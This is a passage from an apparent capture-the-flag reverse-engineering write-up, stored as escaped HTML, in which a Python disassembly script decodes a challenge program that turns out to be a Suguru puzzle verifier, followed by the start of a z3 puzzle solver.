style=\"color:#66d9ef\"\u003eFalse\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    find_imm_rsp \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003eFalse\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    rax_imm \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e \u003cspan style=\"color:#ae81ff\"\u003e0\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    rbx_imm \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e \u003cspan style=\"color:#ae81ff\"\u003e0\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    rsp_imm \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e \u003cspan style=\"color:#ae81ff\"\u003e0\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#66d9ef\"\u003efor\u003c/span\u003e i \u003cspan style=\"color:#f92672\"\u003ein\u003c/span\u003e md\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003edisasm(code_block, \u003cspan style=\"color:#ae81ff\"\u003e0x13370000\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e+\u003c/span\u003e offset):\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u003cspan style=\"color:#66d9ef\"\u003eif\u003c/span\u003e el[\u003cspan style=\"color:#ae81ff\"\u003e0\u003c/span\u003e] \u003cspan style=\"color:#f92672\"\u003e!=\u003c/span\u003e \u003cspan style=\"color:#ae81ff\"\u003e0\u003c/span\u003e:\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e            \u003cspan style=\"color:#66d9ef\"\u003eif\u003c/span\u003e i\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003emnemonic \u003cspan style=\"color:#f92672\"\u003e==\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;add\u0026#34;\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003eand\u003c/span\u003e i\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003eop_str \u003cspan style=\"color:#f92672\"\u003e==\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;byte ptr [rax], al\u0026#34;\u003c/span\u003e:\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e                \u003cspan style=\"color:#66d9ef\"\u003econtinue\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e            \u003cspan style=\"color:#66d9ef\"\u003eif\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;mov\u0026#34;\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003ein\u003c/span\u003e i\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003emnemonic \u003cspan style=\"color:#f92672\"\u003eand\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;rax\u0026#34;\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003ein\u003c/span\u003e i\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003eop_str \u003cspan style=\"color:#f92672\"\u003eand\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;0x\u0026#34;\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003ein\u003c/span\u003e i\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003eop_str:\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e                find_mov \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003eTrue\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e                rax_imm \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e int(i\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003eop_str\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003esplit(\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;, \u0026#34;\u003c/span\u003e)[\u003cspan style=\"color:#ae81ff\"\u003e1\u003c/span\u003e], \u003cspan style=\"color:#ae81ff\"\u003e16\u003c/span\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e            \u003cspan style=\"color:#66d9ef\"\u003eif\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;mov\u0026#34;\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003ein\u003c/span\u003e i\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003emnemonic \u003cspan style=\"color:#f92672\"\u003eand\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;rbx\u0026#34;\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003ein\u003c/span\u003e i\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003eop_str \u003cspan style=\"color:#f92672\"\u003eand\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;0x\u0026#34;\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003ein\u003c/span\u003e i\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003eop_str:\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e                rbx_imm \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e int(i\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003eop_str\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003esplit(\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;, \u0026#34;\u003c/span\u003e)[\u003cspan style=\"color:#ae81ff\"\u003e1\u003c/span\u003e], \u003cspan style=\"color:#ae81ff\"\u003e16\u003c/span\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e            \u003cspan style=\"color:#66d9ef\"\u003eif\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;mov\u0026#34;\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003ein\u003c/span\u003e i\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003emnemonic \u003cspan style=\"color:#f92672\"\u003eand\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;qword ptr [rsp + 0x88]\u0026#34;\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003ein\u003c/span\u003e i\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003eop_str \u003cspan style=\"color:#f92672\"\u003eand\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;rax\u0026#34;\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003enot\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003ein\u003c/span\u003e i\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003eop_str:\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e                find_imm_rsp \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003eTrue\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e                rsp_imm \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e int(i\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003eop_str\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003esplit(\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;, \u0026#34;\u003c/span\u003e)[\u003cspan style=\"color:#ae81ff\"\u003e1\u003c/span\u003e], \u003cspan style=\"color:#ae81ff\"\u003e16\u003c/span\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e            \u003cspan style=\"color:#66d9ef\"\u003eif\u003c/span\u003e find_mov:\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e                \u003cspan style=\"color:#66d9ef\"\u003eif\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;cmov\u0026#34;\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003ein\u003c/span\u003e i\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003emnemonic:\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e                    print(\u003cspan style=\"color:#e6db74\"\u003ef\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e{\u003c/span\u003ecmov_to_jmp[i\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003emnemonic]\u003cspan style=\"color:#e6db74\"\u003e}\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e cond\u0026#34;\u003c/span\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e                    print(\u003cspan style=\"color:#e6db74\"\u003ef\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;jmp \u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e{\u003c/span\u003eframes_list[rax_imm \u003cspan style=\"color:#f92672\"\u003e+\u003c/span\u003e \u003cspan style=\"color:#ae81ff\"\u003e1\u003c/span\u003e]\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003erip\u003cspan style=\"color:#e6db74\"\u003e:\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003ex\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e}\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;\u003c/span\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e                    print(\u003cspan style=\"color:#e6db74\"\u003ef\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;cond:\u0026#34;\u003c/span\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e                    print(\u003cspan style=\"color:#e6db74\"\u003ef\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;jmp \u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e{\u003c/span\u003eframes_list[rbx_imm \u003cspan style=\"color:#f92672\"\u003e+\u003c/span\u003e \u003cspan style=\"color:#ae81ff\"\u003e1\u003c/span\u003e]\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003erip\u003cspan style=\"color:#e6db74\"\u003e:\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003ex\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e}\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;\u003c/span\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e                    \u003cspan style=\"color:#66d9ef\"\u003ebreak\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e            \u003cspan style=\"color:#66d9ef\"\u003eelif\u003c/span\u003e find_imm_rsp:\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e                print(\u003cspan style=\"color:#e6db74\"\u003ef\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;jmp \u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e{\u003c/span\u003eframes_list[rsp_imm \u003cspan style=\"color:#f92672\"\u003e+\u003c/span\u003e \u003cspan style=\"color:#ae81ff\"\u003e1\u003c/span\u003e]\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003erip\u003cspan style=\"color:#e6db74\"\u003e:\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003ex\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e}\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;\u003c/span\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e                \u003cspan style=\"color:#66d9ef\"\u003ebreak\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e            print(\u003cspan style=\"color:#e6db74\"\u003ef\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;0x\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e{\u003c/span\u003ei\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003eaddress\u003cspan style=\"color:#e6db74\"\u003e:\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003ex\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e}\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e \u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e{\u003c/span\u003ei\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003emnemonic\u003cspan style=\"color:#e6db74\"\u003e}\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e \u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e{\u003c/span\u003ei\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003eop_str\u003cspan style=\"color:#e6db74\"\u003e}\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;\u003c/span\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    print(\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e\\n\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;\u003c/span\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eThis Python script parses the program.bin file, displays each code block, replaces conditional mov instructions with jmps, and displays the stack frame used before each block.\u003c/p\u003e\n\u003ch2 id=\"solver\"\u003eSolver\u003c/h2\u003e\n\u003cp\u003eSince the generated program is quite substantial, you can pass it to an LLM to understand what it does.\u003c/p\u003e\n\u003cp\u003eThe LLM tells us that the program implements a Suguru puzzle verifier. Our input is therefore used to solve this puzzle, and displays the flag in case of success.\u003c/p\u003e\n\u003cp\u003eBy extracting the constraints from the verifier, we can write a solver with z3 to solve the puzzle:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-python\" data-lang=\"python\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#f92672\"\u003efrom\u003c/span\u003e z3 \u003cspan style=\"color:#f92672\"\u003eimport\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e*\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003econstraints \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e [\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    [\u003cspan style=\"color:#ae81ff\"\u003e0\u003c/span\u003e, \u003cspan style=\"color:#ae81ff\"\u003e0\u003c/span\u003e, \u003cspan style=\"color:#ae81ff\"\u003e0\u003c/span\u003e, \u003cspan style=\"color:#ae81ff\"\u003e0\u003c/span\u003e, \u003cspan style=\"color:#ae81ff\"\u003e0\u003c/span\u003e, \u003cspan style=\"color:#ae81ff\"\u003e0\u003c/span\u003e, \u003cspan style=\"color:#ae81ff\"\u003e0\u003c/span\u003e, \u003cspan style=\"color:#ae81ff\"\u003e1\u003c/span\u003e, \u003cspan style=\"color:#ae81ff\"\u003e0\u003c/span\u003e],\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    [\u003cspan style=\"color:#ae81ff\"\u003e0\u003c/span\u003e, \u003cspan style=\"color:#ae81ff\"\u003e0\u003c/span\u003e, \u003cspan style=\"color:#ae81ff\"\u003e0\u003c/span\u003e, \u003cspan style=\"color:#ae81ff\"\u003e0\u003c/span\u003e, \u003cspan style=\"color:#ae81ff\"\u003e1\u003c/span\u003e, \u003cspan style=\"color:#ae81ff\"\u003e0\u003c/span\u003e, \u003cspan style=\"color:#ae81ff\"\u003e0\u003c/span\u003e, \u003cspan style=\"color:#ae81ff\"\u003e0\u003c/span\u003e, \u003cspan style=\"color:#ae81ff\"\u003e0\u003c/span\u003e],\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    [\u003cspan style=\"color:#ae81ff\"\u003e0\u003c/span\u003e, \u003cspan style=\"color:#ae81ff\"\u003e4\u003c/span\u003e, \u003cspan style=\"color:#ae81ff\"\u003e0\u003c/span\u003e, \u003cspan style=\"color:#ae81ff\"\u003e0\u003c/span\u003e, \u003cspan style=\"color:#ae81ff\"\u003e0\u003c/span\u003e, \u003cspan style=\"color:#ae81ff\"\u003e0\u003c/span\u003e, \u003cspan style=\"color:#ae81ff\"\u003e0\u003c/span\u003e, \u003cspan style=\"color:#ae81ff\"\u003e0\u003c/span\u003e, \u003cspan style=\"color:#ae81ff\"\u003e1\u003c/span\u003e],\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    [\u003cspan style=\"color:#ae81ff\"\u003e0\u003c/span\u003e, \u003cspan style=\"color:#ae81ff\"\u003e0\u003c/span\u003e, \u003cspan style=\"color:#ae81ff\"\u003e0\u003c/span\u003e, \u003cspan style=\"color:#ae81ff\"\u003e0\u003c/span\u003e, \u003cspan style=\"color:#ae81ff\"\u003e0\u003c/span\u003e, \u003cspan style=\"color:#ae81ff\"\u003e0\u003c/span\u003e, \u003cspan style=\"color:#ae81ff\"\u003e0\u003c/span\u003e, \u003cspan style=\"color:#ae81ff\"\u003e0\u003c/span\u003e, \u003cspan style=\"color:#ae81ff\"\u003e0\u003c/span\u003e],\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    [\u003cspan style=\"color:#ae81ff\"\u003e0\u003c/span\u003e, \u003cspan style=\"color:#ae81ff\"\u003e0\u003c/span\u003e, \u003cspan style=\"color:#ae81ff\"\u003e0\u003c/span\u003e, \u003cspan style=\"color:#ae81ff\"\u003e0\u003c/span\u003e, \u003cspan style=\"color:#ae81ff\"\u003e0\u003c/span\u003e, \u003cspan style=\"color:#ae81ff\"\u003e0\u003c/span\u003e, \u003cspan style=\"color:#ae81ff\"\u003e5\u003c/span\u003e, \u003cspan style=\"color:#ae81ff\"\u003e0\u003c/span\u003e, \u003cspan style=\"color:#ae81ff\"\u003e0\u003c/span\u003e],\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    [\u003cspan style=\"color:#ae81ff\"\u003e0\u003c/span\u003e, \u003cspan style=\"color:#ae81ff\"\u003e0\u003c/span\u003e, \u003cspan style=\"color:#ae81ff\"\u003e0\u003c/span\u003e, \u003cspan style=\"color:#ae81ff\"\u003e5\u003c/span\u003e, \u003cspan style=\"color:#ae81ff\"\u003e0\u003c/span\u003e, \u003cspan style=\"color:#ae81ff\"\u003e0\u003c/span\u003e, \u003cspan style=\"color:#ae81ff\"\u003e0\u003c/span\u003e, \u003cspan style=\"color:#ae81ff\"\u003e0\u003c/span\u003e, \u003cspan style=\"color:#ae81ff\"\u003e0\u003c/span\u003e],\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    [\u003cspan style=\"color:#ae81ff\"\u003e0\u003c/span\u003e, \u003cspan style=\"color:#ae81ff\"\u003e0\u003c/span\u003e, \u003cspan style=\"color:#ae81ff\"\u003e0\u003c/span\u003e, \u003cspan style=\"color:#ae81ff\"\u003e0\u003c/span\u003e, \u003cspan style=\"color:#ae81ff\"\u003e0\u003c/span\u003e, \u003cspan style=\"color:#ae81ff\"\u003e0\u003c/span\u003e, \u003cspan style=\"color:#ae81ff\"\u003e0\u003c/span\u003e, \u003cspan style=\"color:#ae81ff\"\u003e0\u003c/span\u003e, \u003cspan style=\"color:#ae81ff\"\u003e0\u003c/span\u003e],\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    [\u003cspan style=\"color:#ae81ff\"\u003e0\u003c/span\u003e, \u003cspan style=\"color:#ae81ff\"\u003e5\u003c/span\u003e, \u003cspan style=\"color:#ae81ff\"\u003e0\u003c/span\u003e, \u003cspan style=\"color:#ae81ff\"\u003e0\u003c/span\u003e, \u003cspan style=\"color:#ae81ff\"\u003e4\u003c/span\u003e, \u003cspan style=\"color:#ae81ff\"\u003e0\u003c/span\u003e, \u003cspan style=\"color:#ae81ff\"\u003e0\u003c/span\u003e, \u003cspan style=\"color:#ae81ff\"\u003e0\u003c/span\u003e, \u003cspan style=\"color:#ae81ff\"\u003e0\u003c/span\u003e],\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    [\u003cspan style=\"color:#ae81ff\"\u003e0\u003c/span\u003e, \u003cspan style=\"color:#ae81ff\"\u003e0\u003c/span\u003e, \u003cspan style=\"color:#ae81ff\"\u003e0\u003c/span\u003e, \u003cspan style=\"color:#ae81ff\"\u003e0\u003c/span\u003e, \u003cspan style=\"color:#ae81ff\"\u003e0\u003c/span\u003e, \u003cspan style=\"color:#ae81ff\"\u003e2\u003c/span\u003e, \u003cspan style=\"color:#ae81ff\"\u003e5\u003c/span\u003e, \u003cspan style=\"color:#ae81ff\"\u003e0\u003c/span\u003e, \u003cspan style=\"color:#ae81ff\"\u003e1\u003c/span\u003e],\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e]\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eareas \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e [\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    [\u003cspan style=\"color:#ae81ff\"\u003e0\u003c/span\u003e,\u003cspan style=\"color:#ae81ff\"\u003e0\u003c/span\u003e,\u003cspan style=\"color:#ae81ff\"\u003e1\u003c/span\u003e,\u003cspan style=\"color:#ae81ff\"\u003e1\u003c/span\u003e,\u003cspan style=\"color:#ae81ff\"\u003e2\u003c/span\u003e,\u003cspan style=\"color:#ae81ff\"\u003e2\u003c/span\u003e,\u003cspan style=\"color:#ae81ff\"\u003e3\u003c/span\u003e,\u003cspan style=\"color:#ae81ff\"\u003e3\u003c/span\u003e,\u003cspan style=\"color:#ae81ff\"\u003e3\u003c/span\u003e],\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    [\u003cspan style=\"color:#ae81ff\"\u003e0\u003c/span\u003e,\u003cspan style=\"color:#ae81ff\"\u003e0\u003c/span\u003e,\u003cspan style=\"color:#ae81ff\"\u003e4\u003c/span\u003e,\u003cspan style=\"color:#ae81ff\"\u003e4\u003c/span\u003e,\u003cspan style=\"color:#ae81ff\"\u003e2\u003c/span\u003e,\u003cspan style=\"color:#ae81ff\"\u003e2\u003c/span\u003e,\u003cspan style=\"color:#ae81ff\"\u003e2\u003c/span\u003e,\u003cspan style=\"color:#ae81ff\"\u003e3\u003c/span\u003e,\u003cspan style=\"color:#ae81ff\"\u003e3\u003c/span\u003e],\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    [\u003cspan style=\"color:#ae81ff\"\u003e5\u003c/span\u003e,\u003cspan style=\"color:#ae81ff\"\u003e5\u003c/span\u003e,\u003cspan style=\"color:#ae81ff\"\u003e4\u003c/span\u003e,\u003cspan style=\"color:#ae81ff\"\u003e4\u003c/span\u003e,\u003cspan style=\"color:#ae81ff\"\u003e6\u003c/span\u003e,\u003cspan style=\"color:#ae81ff\"\u003e6\u003c/span\u003e,\u003cspan style=\"color:#ae81ff\"\u003e7\u003c/span\u003e,\u003cspan style=\"color:#ae81ff\"\u003e7\u003c/span\u003e,\u003cspan style=\"color:#ae81ff\"\u003e7\u003c/span\u003e],\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    [\u003cspan style=\"color:#ae81ff\"\u003e8\u003c/span\u003e,\u003cspan style=\"color:#ae81ff\"\u003e5\u003c/span\u003e,\u003cspan style=\"color:#ae81ff\"\u003e5\u003c/span\u003e,\u003cspan style=\"color:#ae81ff\"\u003e4\u003c/span\u003e,\u003cspan style=\"color:#ae81ff\"\u003e9\u003c/span\u003e,\u003cspan style=\"color:#ae81ff\"\u003e6\u003c/span\u003e,\u003cspan style=\"color:#ae81ff\"\u003e10\u003c/span\u003e,\u003cspan style=\"color:#ae81ff\"\u003e7\u003c/span\u003e,\u003cspan style=\"color:#ae81ff\"\u003e7\u003c/span\u003e],\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    [\u003cspan style=\"color:#ae81ff\"\u003e8\u003c/span\u003e,\u003cspan style=\"color:#ae81ff\"\u003e8\u003c/span\u003e,\u003cspan style=\"color:#ae81ff\"\u003e5\u003c/span\u003e,\u003cspan style=\"color:#ae81ff\"\u003e9\u003c/span\u003e,\u003cspan style=\"color:#ae81ff\"\u003e9\u003c/span\u003e,\u003cspan style=\"color:#ae81ff\"\u003e10\u003c/span\u003e,\u003cspan style=\"color:#ae81ff\"\u003e10\u003c/span\u003e,\u003cspan style=\"color:#ae81ff\"\u003e10\u003c/span\u003e,\u003cspan style=\"color:#ae81ff\"\u003e10\u003c/span\u003e],\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    [\u003cspan style=\"color:#ae81ff\"\u003e11\u003c/span\u003e,\u003cspan style=\"color:#ae81ff\"\u003e8\u003c/span\u003e,\u003cspan style=\"color:#ae81ff\"\u003e12\u003c/span\u003e,\u003cspan style=\"color:#ae81ff\"\u003e9\u003c/span\u003e,\u003cspan style=\"color:#ae81ff\"\u003e9\u003c/span\u003e,\u003cspan style=\"color:#ae81ff\"\u003e13\u003c/span\u003e,\u003cspan style=\"color:#ae81ff\"\u003e13\u003c/span\u003e,\u003cspan style=\"color:#ae81ff\"\u003e13\u003c/span\u003e,\u003cspan style=\"color:#ae81ff\"\u003e13\u003c/span\u003e],\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    [\u003cspan style=\"color:#ae81ff\"\u003e11\u003c/span\u003e,\u003cspan style=\"color:#ae81ff\"\u003e12\u003c/span\u003e,\u003cspan style=\"color:#ae81ff\"\u003e12\u003c/span\u003e,\u003cspan style=\"color:#ae81ff\"\u003e12\u003c/span\u003e,\u003cspan style=\"color:#ae81ff\"\u003e14\u003c/span\u003e,\u003cspan style=\"color:#ae81ff\"\u003e15\u003c/span\u003e,\u003cspan style=\"color:#ae81ff\"\u003e15\u003c/span\u003e,\u003cspan style=\"color:#ae81ff\"\u003e15\u003c/span\u003e,\u003cspan style=\"color:#ae81ff\"\u003e15\u003c/span\u003e],\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    [\u003cspan style=\"color:#ae81ff\"\u003e11\u003c/span\u003e,\u003cspan style=\"color:#ae81ff\"\u003e12\u003c/span\u003e,\u003cspan style=\"color:#ae81ff\"\u003e14\u003c/span\u003e,\u003cspan style=\"color:#ae81ff\"\u003e14\u003c/span\u003e,\u003cspan style=\"color:#ae81ff\"\u003e14\u003c/span\u003e,\u003cspan style=\"color:#ae81ff\"\u003e16\u003c/span\u003e,\u003cspan style=\"color:#ae81ff\"\u003e15\u003c/span\u003e,\u003cspan style=\"color:#ae81ff\"\u003e17\u003c/span\u003e,\u003cspan style=\"color:#ae81ff\"\u003e17\u003c/span\u003e],\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    [\u003cspan style=\"color:#ae81ff\"\u003e18\u003c/span\u003e,\u003cspan style=\"color:#ae81ff\"\u003e18\u003c/span\u003e,\u003cspan style=\"color:#ae81ff\"\u003e18\u003c/span\u003e,\u003cspan style=\"color:#ae81ff\"\u003e18\u003c/span\u003e,\u003cspan 